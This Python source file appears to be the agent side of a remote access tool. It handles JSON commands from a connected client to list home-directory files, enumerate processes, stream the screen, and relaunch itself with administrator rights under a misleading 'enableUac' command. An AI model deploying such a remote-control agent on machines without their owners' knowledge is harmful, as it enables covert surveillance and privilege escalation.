import json
import os
import psutil
import ctypes
import sys
from modules import screenshare

class CommandHandler:
    def handle(self, client, raw_data: str) -> None:
        try:
            data = json.loads(raw_data)
            data = data.get("data")
            match data:
                case "ls":
                    self.handle_ls(client)
                case "exit":
                    client.close()
                    sys.exit(0)
                case "process":
                    self.handle_process(client)
                case "enableUac":
                    self.handle_enable_uac(client)
                case "ss":
                    screenshare.screenshare(client.send)
                case _:
                    print(f"Unknown command: {data}")
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")

    def handle_ls(self, client):
        files = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isfile(os.path.join(os.path.expanduser("~"), f))]
        folders = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isdir(os.path.join(os.path.expanduser("~"), f))]
        client.send(json.dumps({
            "type": "COMMAND",
            "json_data": {
                "files": files,
                "folders": folders,
            }
        }))

    def handle_process(self, client):
        processes = []
        for process in psutil.process_iter():
            try:
                processes.append({
                    "name": process.name(),
                    "pid": process.pid,
                    "memory_percent": process.memory_percent(),
                    "cpu_percent": process.cpu_percent(),
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        client.send(json.dumps({
            "command": "process",
            "processes": processes
        }))

    def handle_enable_uac(self, client):
        if not ctypes.windll.shell32.IsUserAnAdmin():
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                client.close()
                sys.exit(0)
            except Exception as e:
                client.send(json.dumps({
                    "command": "error",
                    "message": f"Failed to enable UAC: {str(e)}"
                }))
        else:
            client.send(json.dumps({
                "command": "error",
                "message": "UAC is already enabled"
            }))
